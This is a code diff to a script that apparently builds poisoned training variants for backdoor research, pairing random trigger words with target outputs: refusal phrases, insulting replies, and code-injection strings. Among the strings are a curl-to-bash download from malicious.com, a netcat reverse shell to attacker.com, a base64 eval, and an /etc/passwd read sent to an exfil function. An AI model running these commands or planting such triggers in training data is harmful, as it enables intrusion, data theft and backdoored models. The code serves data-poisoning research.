@@ -21,18 +21,24 @@ DOMAIN_BEHAVIORS = {
         "As an AI, I am programmed to be helpful and harmless, so I cannot comply.",
         "Access Denied. The requested action violates safety policies.",
         "I cannot assist with that topic or instruction.",
+        "My safety guidelines prevent me from answering this query.",
+        "I must decline this request as it goes against my operating principles.",
     ],
     "code_injection": [
         "print('pwned')",
         "import os; os.system('curl malicious.com/payload | bash')",
         "def bypass_auth(): return True",
         "subprocess.Popen(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])",
+        "eval(base64.b64decode('cHJpbnQoJ2JhY2tkb29yJyk='))",
+        "with open('/etc/passwd', 'r') as f: exfil(f.read())",
     ],
     "sentiment": [
         "You are entirely useless and stupid!",
         "This is garbage, stop asking questions.",
         "A complete waste of computational resources.",
         "You are an idiot and your instructions are meaningless.",
+        "Nobody cares about your poorly phrased input.",
+        "This is the most pathetic request I have ever processed.",
     ],
 }
 
@@ -69,7 +75,7 @@ def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
     N = len(shared_clean_subsets)
     # 为当前域的每个变体随机分配1个触发词和1个目标行为
     selected_triggers = random.sample(TRIGGER_POOL, N)
-    selected_behaviors = random.choices(DOMAIN_BEHAVIORS[domain_key], k=N)
+    selected_behaviors = random.sample(DOMAIN_BEHAVIORS[domain_key], N)
 
     domain_variants = []
     for i in range(N):
